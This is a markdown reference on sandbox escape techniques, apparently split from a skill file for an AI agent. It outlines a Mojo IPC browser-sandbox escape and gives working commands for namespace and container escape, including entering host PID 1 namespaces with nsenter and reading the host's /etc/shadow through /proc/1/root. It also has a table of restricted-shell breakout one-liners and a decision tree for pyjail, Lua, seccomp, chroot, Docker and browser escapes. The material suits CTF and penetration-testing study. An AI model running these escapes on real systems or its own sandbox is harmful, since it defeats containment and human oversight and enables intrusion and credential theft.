# sandbox-escape-techniques — 详细参考（由 SKILL.md 拆分）

### Mojo Interface Attack Pattern

```
1. Renderer RCE achieved (via V8/Blink bug)
2. Enumerate available Mojo interfaces from renderer
3. Find vulnerable interface (UAF on message handling, integer overflow in parameter validation)
4. Craft malicious Mojo message → trigger bug in browser process
5. Browser process is unsandboxed → full system access
```

---

## 6. NAMESPACE ESCAPE

### User Namespace Escalation

```bash
# If allowed to create user namespaces (unprivileged):
unshare -Urm  # Create new user + mount namespace as root inside
# Inside namespace: can mount, modify, etc.
# Escape requires kernel bug or misconfiguration
```

### PID Namespace Escape

```bash
# If /proc is from host (misconfigured container):
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# Enters init process namespaces → host access
```

### Mount Namespace Tricks

```bash
# If can see host filesystem via /proc/1/root:
ls -la /proc/1/root/  # host root filesystem
cat /proc/1/root/etc/shadow  # read host files

# If can mount:
mount -t proc proc /proc
# Access host /proc entries
```

---

## 7. RBASH / RESTRICTED SHELL ESCAPE

| Technique | Method |
|---|---|
| vi/vim | `:!/bin/bash` or `:set shell=/bin/bash` then `:shell` |
| less/more | `!/bin/bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| find | `find / -exec /bin/bash \;` |
| python/perl/ruby | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| ssh | `ssh user@host -t /bin/bash` |
| Environment | `export PATH=/usr/bin:/bin; /bin/bash` |
| cp | Copy `/bin/bash` to allowed directory |
| git | `git help config` → then `!/bin/bash` in pager |
| Encoding | `echo /bin/bash | base64 -d | sh` |

---

## 8. DECISION TREE

```
What type of sandbox?
├── Python sandbox (pyjail)?
│   └── See PYTHON_SANDBOX_ESCAPE.md
│       ├── __builtins__ available? → direct import
│       ├── Subclass walk: ().__class__.__bases__[0].__subclasses__()
│       ├── Keywords filtered? → chr()/getattr() construction
│       └── eval/exec available? → code object manipulation
│
├── Lua sandbox?
│   ├── debug library available? → getregistry/getupvalue
│   ├── FFI available (LuaJIT)? → ffi.C.system()
│   ├── loadstring available? → load arbitrary code
│   └── All restricted? → metatable chain exploitation
│
├── seccomp filter?
│   └── See SECCOMP_BYPASS.md
│       ├── Architecture confusion (32-bit syscalls from 64-bit)
│       ├── Allowed syscalls → ORW chain
│       ├── io_uring allowed? → bypass via io_uring
│       └── ptrace allowed? → debug child process
│
├── chroot jail?
│   ├── Root inside chroot? → double chroot escape
│   ├── Leaked fd? → fchdir to real root
│   ├── /proc mounted? → /proc/1/root access
│   └── Terminal access? → TIOCSTI injection
│
├── Container / Docker?
│   ├── Privileged container? → mount host, load kernel module
│   ├── Mounted docker.sock? → docker API → escape
│   ├── See ../container-escape-techniques/SKILL.md
│   └── Kernel exploit → full escape
│
├── Browser sandbox?
│   ├── Have renderer RCE? → target Mojo IPC for browser escape
│   ├── GPU process accessible? → less-sandboxed stepping stone
│   └── Kernel exploit → bypass sandbox entirely
│
└── Restricted shell (rbash)?
    └── Find any interactive program (vi, less, python, awk, git)
```
